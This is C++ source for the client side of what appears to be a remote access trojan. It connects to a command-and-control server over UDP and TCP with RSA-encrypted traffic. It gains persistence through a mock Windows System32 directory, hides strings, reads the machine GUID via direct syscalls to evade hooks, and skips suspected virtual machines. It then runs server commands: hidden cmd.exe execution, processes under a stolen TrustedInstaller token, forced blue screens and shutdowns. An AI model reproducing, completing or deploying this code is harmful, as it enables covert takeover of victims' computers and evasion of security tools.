#include "Client.h"
#include "NetworkManager.h"
#include "Syscalls.h"

#define ADD_TO_STARTUP TRUE

#ifdef CLIENT_RELEASE

Client::Client() {
    // setup udp addr
    hostent* host = GetHostByName(DNS_NAME.c_str());
    if ( host == NULL )
        return;

    sockaddr_in addr;
    memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
    addr.sin_family = AF_INET;
    addr.sin_port = HostToNetworkShort(UDP_PORT);

    // set udp server info
    this->m_UDPServerDetails.addr = addr;
    this->m_UDPServerDetails.domain = AF_INET;
    this->m_UDPServerDetails.port = UDP_PORT;
    this->m_UDPServerDetails.type = SOCK_DGRAM;

    RSAKeys gen = LGCrypto::GenerateRSAPair(4096);
    this->SetRequestSecrets(gen);
    SetRemoteMachineGUID();
    SetRemoteComputerName();

    if ( ADD_TO_STARTUP == TRUE )
        this->m_ProcMgr.AddProcessToStartup((char*)HIDE("C:\\Windows \\System32\\ComputerDefaults.exe"));
}

Client::~Client() {
    this->Disconnect(); // disconnect incase the socket is still connected

    CleanWSA();
}

void Client::SetRemoteComputerName() {
    char  buffer[256];
    DWORD buffSize = sizeof(buffer);

    // get computer name
    BOOL success = GetComputerNameA(buffer, &buffSize);
    if ( success )
        this->m_ComputerName = buffer;
}

bool Client::Connect() {
    if ( this->m_MachineGUID == ":(" ) 
        return false; // vm or some controlled environment

    // make request to udp server
    this->m_UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if ( this->m_UDPSocket == INVALID_SOCKET )
        return false;

    // set timeout for sending and receiving on udp socket
    // if it times out that means server is not on
    m_NetworkManager.SetSocketTimeout(this->m_UDPSocket, 2000, SO_SNDTIMEO);

    ClientRequest request(ClientRequest::kConnectClient, 0, this->m_UDPSocket);
    bool sent = SendMessageToServer(this->m_UDPServerDetails, request);
    if ( !sent ) {
        CloseSocket(this->m_UDPSocket);
        return false;
    }
    
    m_NetworkManager.SetSocketTimeout(this->m_UDPSocket, 2000, SO_RCVTIMEO);

    Server      TCPServer;
    sockaddr_in serverAddr;
    bool received = m_NetworkManager.ReceiveData(TCPServer, this->m_UDPSocket, UDP, serverAddr);
    if ( !received ) {
        CloseSocket(this->m_UDPSocket);
        return false;
    }
    
    // reset udp socket timeouts
    m_NetworkManager.ResetSocketTimeout(this->m_UDPSocket, SO_RCVTIMEO);
    m_NetworkManager.ResetSocketTimeout(this->m_UDPSocket, SO_SNDTIMEO);

    this->m_UDPServerDetails.addr = serverAddr;
    this->m_TCPServerDetails      = TCPServer;

    // connect to tcp server
    this->m_TCPSocket = CreateSocket(AF_INET, SOCK_STREAM, 0);
    if ( this->m_TCPSocket == INVALID_SOCKET ) {
        CloseSocket(this->m_UDPSocket);
        return false;
    }

    int connect = ConnectSocket(this->m_TCPSocket, ( sockaddr* ) &this->m_TCPServerDetails.addr, sizeof(this->m_TCPServerDetails.addr));
    if ( connect == SOCKET_ERROR ) {
        CloseSocket(this->m_TCPSocket);
        CloseSocket(this->m_UDPSocket);
        return false;
    }

    RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
    this->SetRequestSecrets(keys);

    if ( !ExchangePublicKeys() || !SendComputerNameToServer() || !SendMachineGUIDToServer() )
        return false;
   
    return true;
}

void Client::SetRemoteMachineGUID() {
    OBJECT_ATTRIBUTES obj;
    InitializeObjectAttributes(&obj, 0, 0, 0, 0);

    std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Cryptography"));
    std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());

    UNICODE_STRING reg;
    reg.Buffer = wide.data();
    reg.Length = wide.size() * sizeof(wchar_t);
    reg.MaximumLength = sizeof(reg.Buffer);

    std::string hiddenName = std::string(HIDE("MachineGuid"));
    std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());

    UNICODE_STRING valueName;
    valueName.Buffer = name.data();
    valueName.Length = name.size() * sizeof(wchar_t);
    valueName.MaximumLength = sizeof(valueName.Length);

    obj.Length = sizeof(OBJECT_ATTRIBUTES);
    obj.RootDirectory = NULL;
    obj.ObjectName = &reg;
    obj.SecurityDescriptor = NULL;
    obj.SecurityQualityOfService = NULL;
    obj.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE key;
    this->m_ProcMgr.GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenKey"));
    SysNtOpenKey(&key, GENERIC_READ, &obj);

    char buffer[512];
    u_long size;

    this->m_ProcMgr.GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtQueryValueKey"));
    SysNtQueryValueKey(key, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &size);
    PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
    std::wstring data = ( wchar_t* ) pk->Data;
    std::string string = std::string(data.begin(), data.end());

    if ( string.length() != 36 ) {
        this->m_MachineGUID = ":(";
        return;
    }

    this->m_MachineGUID = string;
}

BYTESTRING Client::MakeTCPRequest(const ClientRequest& req, BOOL encrypted) {

    BOOL sent = FALSE;

    if ( encrypted )
        sent = m_NetworkManager.TransmitData(req, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
    else
        sent = m_NetworkManager.TransmitData(req, this->m_TCPSocket, TCP);

    if ( !sent ) return {};

    BYTESTRING data;
    BOOL received = m_NetworkManager.ReceiveData(data, this->m_TCPSocket, TCP);
    if ( !received ) return {};

    if ( encrypted ) {
        BYTESTRING decrypted = LGCrypto::RSADecrypt(data, this->m_RequestSecrets.priv, TRUE);
        return decrypted;
    }

    return data;
}

bool Client::SendComputerNameToServer() {
    return SendMessageToServer(this->m_ComputerName, TRUE);
}

bool Client::SendMachineGUIDToServer() {
    return SendMessageToServer(this->m_MachineGUID, TRUE);
}

const CMDDESC Client::CreateCommandDescription(const Packet& command) {
    std::string buffer(command.buffer, command.buffLen);
    
    CMDDESC description;
    description.respondToServer = ( command.flags & RESPOND_WITH_STATUS );
    description.creationFlags   = ( command.flags & NO_CONSOLE ) ? CREATE_NO_WINDOW : CREATE_NEW_CONSOLE;
    description.application     = std::wstring(buffer.begin(), buffer.end()); // default application to run is wtv in command buffer

    if ( command.flags & RUN_AS_HIGHEST && this->m_ProcMgr.GetProcessSecurityContext() < SecurityContext::Highest )
        this->m_ProcMgr.GetTrustedInstallerToken();

    if ( command.flags & USE_CLI ) { 
        description.application = std::wstring(HIDE(L"C:\\Windows\\System32\\cmd.exe")); // use cmd.exe
        description.commandArgs += std::wstring(buffer.begin(), buffer.end()); // buffer are the command line args
    }

    description.creationContext = this->m_ProcMgr.GetToken();

    return description;
}

BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) {
    BOOL    success     = FALSE;
    CMDDESC description = CreateCommandDescription(command);
    char*   cmdOut = new char; // output of system()

    switch ( command.action ) {
    case RemoteAction::kAddToStartup:
        this->m_ProcMgr.AddProcessToStartup(command.buffer);
        success = TRUE;
        break;
    case RemoteAction::kPingClient:
        success = TRUE;
        break;
    case RemoteAction::kRemoteBSOD:
        this->m_ProcMgr.BSOD();
        break;
    case RemoteAction::kRemoteShutdown:
        if ( strcmp(command.buffer, "shutdown") == 0 )
            ProcessManager::ShutdownSystem(ShutdownPowerOff);
        else if ( strcmp(command.buffer, "restart") == 0 )
            ProcessManager::ShutdownSystem(ShutdownReboot);

        break;
    case RemoteAction::kOpenRemoteProcess:

        success = this->m_ProcMgr.OpenProcessAsImposter(
            description.creationContext,
            LOGON_WITH_PROFILE,
            description.application.data(),
            description.commandArgs.data(),
            description.creationFlags,
            NULL,
            NULL,
            description.respondToServer,
            cmdOut
        );

        break;
    }

    if ( description.respondToServer ) {
        outResponse.actionPerformed = command.action;
        outResponse.responseCode = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
        memcpy_s(outResponse.buffer, strlen(outResponse.buffer), cmdOut, strlen(cmdOut) );
        outResponse.buffLen = strlen(outResponse.buffer);
    }

    delete cmdOut;

    return success;
}

bool Client::IsServerAwaitingResponse(const Packet& commandPerformed) {
    bool sendResponse = false;
    switch ( commandPerformed.action ) {
    case RemoteAction::kPingClient:
        sendResponse = true;
        break;
    }
    return sendResponse;
}

Packet Client::OnEncryptedPacket(BYTESTRING encrypted) {
    BYTESTRING decrypted    = LGCrypto::RSADecrypt(encrypted, this->m_RequestSecrets.priv, TRUE); 
    if ( !LGCrypto::GoodDecrypt(decrypted) )
        return {};

    return Serialization::DeserializeToStruct<Packet>(decrypted);;
}

void Client::ListenForServerCommands() {
    BOOL received = FALSE;
    while ( TRUE ) {
        BYTESTRING encrypted;

        received = m_NetworkManager.ReceiveData(
            encrypted,
            this->m_TCPSocket,
            TCP
        );

        if ( !received ) {
            if ( this->m_TCPSocket == INVALID_SOCKET )
                break;
            
            continue;
        }

        Packet receivedPacket = OnEncryptedPacket(encrypted);
        ClientResponse responseToServer;
        
        if ( receivedPacket.action == kKeepAlive ) {
            // echo keep alive
            m_NetworkManager.TransmitData(receivedPacket, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
            continue;
        } else if ( receivedPacket.action == kKillClient ) {
            this->Disconnect();
            break;
        }

        if ( receivedPacket.flags & PACKET_IS_A_COMMAND ) {
            PerformCommand(receivedPacket, responseToServer);
        }

        // dont need to respond to server with 'responseToServer'
        if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == FALSE )
            continue;

        // respond to server with 'responseToServer'
        m_NetworkManager.TransmitData(responseToServer, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
    }
}

// todo: add some error handling
bool Client::ExchangePublicKeys() {
    unsigned char* derClientPubKey = NULL;
    int            derClientPubKeyLen = i2d_RSAPublicKey(this->m_RequestSecrets.pub, nullptr);

    if ( derClientPubKeyLen < 0 )
        return false;

    // convert RSA* to unsigned char*, this function already mallocs 
    // derClientPubKey for us
    i2d_RSAPublicKey(this->m_RequestSecrets.pub, &derClientPubKey); 

    // Send size of public key first to server
    int sent = Send(this->m_TCPSocket, ( char* ) &derClientPubKeyLen, sizeof(derClientPubKeyLen), 0);
    if ( sent <= 0 ) {
        free(derClientPubKey);
        return false;
    }

    // send der format of rsa key to server
    sent = Send(this->m_TCPSocket, ( char* ) derClientPubKey, derClientPubKeyLen, 0);
    if ( sent <= 0 ) {
        free(derClientPubKey);
        return false;
    }

    // now receive the public key length
    unsigned char* derServerPubKey = NULL;
    int            derServerPubKeyLen = 0;
    int received = Receive(this->m_TCPSocket, ( char* ) &derServerPubKeyLen, sizeof(derServerPubKeyLen), 0);
    if ( received <= 0 ) {
        free(derClientPubKey);
        return false;
    }

    // allocate the size of the key in memory for a buffer
    derServerPubKey = (unsigned char*)malloc(derServerPubKeyLen);
    
    // receive the der format of the servers public rsa key
    received = Receive(this->m_TCPSocket, ( char* ) derServerPubKey, derServerPubKeyLen, 0);
    if ( received <= 0 ) {
        free(derClientPubKey);
        free(derServerPubKey);
        return false;
    }

    const unsigned char* constDerServerPubKey = derServerPubKey;
    
    // convert unsigned char* der rsa key to RSA* object
    RSA* rsaServerPubKey = d2i_RSAPublicKey(nullptr, &constDerServerPubKey, derServerPubKeyLen );
    if ( !rsaServerPubKey ) {
        free(derClientPubKey);
        free(derServerPubKey);
        return false;
    }

    this->m_ServerPublicKey = rsaServerPubKey;
        
    free(derClientPubKey);
    free(derServerPubKey);
    return true;
}

bool Client::SendMessageToServer(std::string message, BOOL encrypted) {    

    BYTESTRING serialized = Serialization::SerializeString(message);
    bool       success    = false;

    if ( encrypted ) {
        success = m_NetworkManager.TransmitData(serialized, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
    } else
        success = m_NetworkManager.TransmitData(serialized, this->m_TCPSocket, TCP);

    return success;
}

bool Client::SendMessageToServer(Server& dest, ClientMessage message) {
    bool success = false;

    if ( dest.type == SOCK_STREAM ) // tcp
        return m_NetworkManager.TransmitData(message, this->m_TCPSocket, TCP);
    else if ( dest.type == SOCK_DGRAM )
        return m_NetworkManager.TransmitData(message, this->m_UDPSocket, UDP, dest.addr);

    return false;
}

bool Client::Disconnect() {
    CloseSocket(this->m_UDPSocket);
    CloseSocket(this->m_TCPSocket);

    this->m_UDPSocket = INVALID_SOCKET;
    this->m_TCPSocket = INVALID_SOCKET;

    return true;
}

#elif defined(SERVER_RELEASE)

#include <random>

Client::Client(SOCKET tcp, sockaddr_in addr)
    : AddressInfo(addr), m_TCPSocket(tcp)
{
    std::random_device gen;
    std::mt19937 rng(gen());
    std::uniform_int_distribution<std::mt19937::result_type> dist(1, 100000);
    this->ClientUID = dist(rng);
}

void Client::Disconnect() {
    this->Alive = FALSE;

    CloseSocket(this->m_TCPSocket);
}

#endif
